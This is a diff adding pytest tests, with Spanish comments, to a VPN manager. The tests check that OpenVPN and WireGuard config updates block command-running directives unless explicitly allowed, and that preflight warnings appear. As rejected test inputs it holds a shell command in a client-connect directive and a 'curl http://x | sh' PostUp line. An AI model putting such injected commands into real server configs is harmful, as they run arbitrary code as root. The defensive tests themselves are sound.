@@ -188,3 +188,44 @@ def test_desconectar_sin_management_explica_como_activarlo(tmp_path):
     b = _backend(_pki(tmp_path, "tls-crypt"))
     with pytest.raises(VpnError, match="management"):
         b._management_kill("x")
+
+
+def test_directivas_que_ejecutan_ordenes(tmp_path):
+    from vpn_manager.backends.wireguard import WireGuardBackend
+
+    conf = tmp_path / "server.conf"
+    conf.write_text("port 1194\nup /etc/openvpn/up.sh\nscript-security 2\n")
+    b = OpenVpnBackend(pki_index=tmp_path / "pki/index.txt", status_file=tmp_path / "s.log", service="x",
+                       sandbox=True, server_conf=conf)
+    keep = [("port", "1195"), ("up", "/etc/openvpn/up.sh"), ("script-security", "2")]
+    b.update_server_config(keep)                                   # las existentes se conservan
+    with pytest.raises(Forbidden, match="root"):
+        b.update_server_config([*keep, ("client-connect", "/bin/sh -c 'id > /tmp/x'")])
+    with pytest.raises(Forbidden):
+        b.update_server_config([("up", "/tmp/otro.sh")])           # cambiar también cuenta
+    b.allow_command_directives = True
+    b.update_server_config([("up", "/tmp/otro.sh")])
+
+    wg = tmp_path / "wg0.conf"
+    wg.write_text("[Interface]\nAddress = 10.0.0.1/24\nPostUp = iptables -A FORWARD -i wg0 -j ACCEPT\n")
+    w = WireGuardBackend(conf=wg, show_file=tmp_path / "show", service="x", sandbox=True)
+    w.update_server_config([("Address", "10.0.0.1/24"), ("PostUp", "iptables -A FORWARD -i wg0 -j ACCEPT")])
+    with pytest.raises(Forbidden):
+        w.update_server_config([("PostUp", "curl http://x | sh")])
+
+
+def test_preflight_avisa_de_crl_y_management(tmp_path):
+    from types import SimpleNamespace
+
+    from vpn_manager.preflight import checks
+
+    conf = tmp_path / "server.conf"
+    conf.write_text("port 1194\n")
+    st = SimpleNamespace(sandbox=False, admin_password_hash="x", secret_key="x", cookie_secure=True,
+                         allow_install=False, allow_command_directives=True, openvpn_server_conf=conf)
+    text = " ".join(c["message"] for c in checks(st))
+    assert "crl-verify" in text and "management" in text and "VPNM_ALLOW_COMMAND_DIRECTIVES" in text
+    conf.write_text("crl-verify crl.pem\nmanagement /run/m.sock unix\n")
+    st.allow_command_directives = False
+    text = " ".join(c["message"] for c in checks(st))
+    assert "crl-verify" not in text and "management" not in text
